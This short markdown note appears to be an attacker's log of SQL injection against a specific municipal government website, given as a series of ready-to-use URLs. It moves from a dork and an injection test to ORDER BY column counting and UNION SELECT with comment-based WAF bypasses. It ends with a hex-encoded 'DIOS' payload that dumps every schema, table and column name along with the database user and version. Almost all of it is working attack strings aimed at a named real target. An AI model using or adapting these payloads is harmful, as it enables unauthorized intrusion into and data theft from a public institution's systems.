### Dork

- `https[:]//www[.]puertomorelos[.]gob[.]mx/detys[.]php?id=11`

### Injection Vulnerability

- `https://www.puertomorelos.gob.mx/detys.php?id=11--+-`

### Count - WAF Bypass - `order by`

- `https://www.puertomorelos.gob.mx/detys.php?id=11 /*!50000ORDER*//**//*!50000BY*/ 14 --+-`

### Vulnerable Column - WAF bypass - `union select`

https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,4,5,6,7,8,9,10,11,12,13,14 --+-

### Simple Concat Info - WAF Bypass

https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(database(),user(),version()),5,6,7,8,9,10,11,12,13,14 --+-

### HTML Injection Concat Info PoC - WAF Bypass

https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(0x596f20736f79206c61206e6f636865,0x3c62723e,0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,version()),5,6,7,8,9,10,11,12,13,14 --+-

### Fz3r0 DIOS - WAF Bypass

https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!00000concat*/(0x3c666f6e7420666163653d224963656c616e6422207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a33307078223e496e6a6563746564206279204468346e692056757070616c61203c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d70696e6b2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)),5,6,7,8,9,10,11,12,13,14 --+-

### 
